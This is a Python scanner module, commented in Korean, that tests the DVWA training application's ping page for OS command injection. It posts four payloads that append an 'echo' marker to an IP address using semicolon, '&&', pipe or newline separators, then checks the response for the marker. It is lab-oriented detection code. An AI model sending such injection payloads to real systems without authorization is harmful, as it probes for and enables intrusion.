# -*- coding: utf-8 -*-
"""
Command Injection 취약점 탐지

DVWA의 exec 페이지는 IP를 입력받아 ping 명령어를 실행하는데,
입력값 검증이 부실하면 세미콜론(;) 등으로 다른 명령어를 이어붙일 수 있다.
"""

COMMAND_INJECTION_PAYLOADS = [
    "127.0.0.1; echo COMMAND_INJECTION_TEST",
    "127.0.0.1 && echo COMMAND_INJECTION_TEST",
    "127.0.0.1 | echo COMMAND_INJECTION_TEST",
    "127.0.0.1\necho COMMAND_INJECTION_TEST",
]


def scan_command_injection(session, base_url, security_level):
    url = f"{base_url}/vulnerabilities/exec/"
    results = []

    for payload in COMMAND_INJECTION_PAYLOADS:
        data = {"ip": payload, "Submit": "Submit"}
        resp = session.post(url, data=data)

        detected = "COMMAND_INJECTION_TEST" in resp.text

        results.append({
            "security_level": security_level,
            "vuln_type": "Command Injection",
            "category": "os_command",
            "payload": payload,
            "url": url,
            "detected": detected,
            "detail": (
                "삽입한 명령어가 실행됨 -> 취약"
                if detected else
                "명령어 실행 안 됨 -> 방어됨"
            ),
        })

    return results
